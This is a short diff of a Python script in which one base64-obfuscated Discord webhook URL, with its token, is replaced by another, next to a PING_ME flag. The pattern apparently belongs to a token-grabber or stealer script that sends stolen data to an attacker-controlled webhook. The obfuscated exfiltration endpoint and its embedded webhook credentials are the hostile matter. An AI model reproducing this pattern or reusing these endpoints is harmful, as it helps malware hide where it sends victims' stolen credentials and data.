@@ -11,7 +11,7 @@ import base64
 from urllib.request import Request, urlopen
 # HERE
 # HERE
-WEBHOOK_URL = base64.b64decode(b'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA2Mzc4Nzk4ODY0NTA1NjU4My9GWU5OUE9raEJTSG1aOFk0WERhTVpjOXk2Y3pUOEZUdUJ4VEx3Um9QYjBSeUpOcm9YTUlRUGxLaWJVRkpHZUp1ZkktMQ==').decode()
+WEBHOOK_URL = base64.b64decode(b'aHR0cHM6Ly9wdGIuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEwNjM4MDg3NTUyNjA3MTkyMjcvMGViWjVrcDVhUElVcWMxdHFzUEV0MnM5N2g5ZHhfbXJqQl9PeHBleWNPd0diUFhRWUlwVm0zaEhjNlJZZXZ4Sk5rY2g=').decode()
 # HERE
 # HERE
 PING_ME = False
